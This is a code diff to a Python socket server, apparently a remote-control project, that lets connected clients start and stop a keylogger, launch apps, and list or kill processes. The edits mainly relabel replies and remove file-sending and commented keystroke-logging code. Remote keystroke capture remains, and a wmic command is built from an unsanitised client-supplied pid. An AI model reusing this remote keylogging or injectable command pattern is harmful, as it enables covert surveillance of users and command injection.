@@ -102,10 +102,10 @@ class Server:
             self.start_keylogger()
             lock += 1
             print(f'[KEYLOGGER] {addr} started keylogger.')
-            conn.send('Keylogger started.'.encode())
+            conn.send('[SUCCESS[ Keylogger started.'.encode())
           else:
             print(f'[KEYLOGGER] {addr} requested start keylogger, but keylogger is already running.')
-            conn.send('Keylogger is already running.'.encode())
+            conn.send('[ERROR] Keylogger is already running.'.encode())
             
           time.sleep(0.01)
           conn.send(FLAG_MSG_END.encode())
@@ -117,10 +117,10 @@ class Server:
             self.stop_keylogger()
             lock -= 1
             print(f'[KEYLOGGER] {addr} stopped keylogger.')
-            conn.send('Keylogger stopped.'.encode())
+            conn.send('[SUCCESS] Keylogger stopped.'.encode())
           else:
             print(f'[KEYLOGGER] {addr} requested stop keylogger, but keylogger is not running.')
-            conn.send('Keylogger is not running.'.encode())
+            conn.send('[ERROR] Keylogger is not running.'.encode())
 
           time.sleep(0.01)
           conn.send(FLAG_MSG_END.encode())
@@ -147,12 +147,12 @@ class Server:
           try:
             self.start_app(str(app_name))
             print(f'[APP] {addr} started app.')
-            conn.send('App started successfully.'.encode())
+            conn.send('[SUCCESS] App started successfully.'.encode())
             time.sleep(0.01)
             conn.send(FLAG_MSG_END.encode())
           except Exception as e:
             print(f'[APP] {addr} failed to start app: {e}')
-            conn.send('Failed to start app.'.encode())
+            conn.send('[ERROR] Failed to start app.'.encode())
             time.sleep(0.01)
             conn.send(FLAG_MSG_END.encode())
 
@@ -186,17 +186,6 @@ class Server:
       f.close()
       conn.send(FLAG_FILE_END.encode())
   
-  def send_tmp_file(self, file, conn):
-    if (os.path.exists(file.name)):
-      f = open(file.name, 'rb')
-      bytes = f.read(BUFFER_SIZE)
-      while bytes:
-        conn.send(bytes)
-        bytes = f.read(BUFFER_SIZE)
-      time.sleep(0.05)
-      f.close()
-      conn.send(FLAG_FILE_END.encode())
-
   def get_all_processes(self):
     return os.popen('wmic process get description, processid, threadcount').read()
 
@@ -205,29 +194,6 @@ class Server:
     os.popen('wmic process where processid=' + pid + ' call terminate')
 
   def on_press(self, key):
-    # try:
-    #   if key == None:
-    #     key = '<!>'
-    #   if key == keyboard.Key.enter:
-    #     key = '<enter>'
-    #   if key == keyboard.Key.space:
-    #     key = '<space>'
-    #   if key == keyboard.Key.tab:
-    #     key = '<tab>'
-    #   if key == keyboard.Key.shift:
-    #     key = '<shift>'
-    #   if key == keyboard.Key.backspace:
-    #     key = '<backspace>'
-    #   if key == keyboard.Key.esc:
-    #     key = '<esc>'
-    #   if key == keyboard.Key.ctrl:
-    #     key = '<ctrl>'
-    # except UnicodeEncodeError:
-    #   key = '<!>'
-    # with open(os.path.join(TMP_PATH, 'keylog.txt'), 'a') as f:
-    #   key = str(key).replace("'", '')
-    #   f.write(key)
-
     logging.info(str(key))
 
   def start_keylogger(self):
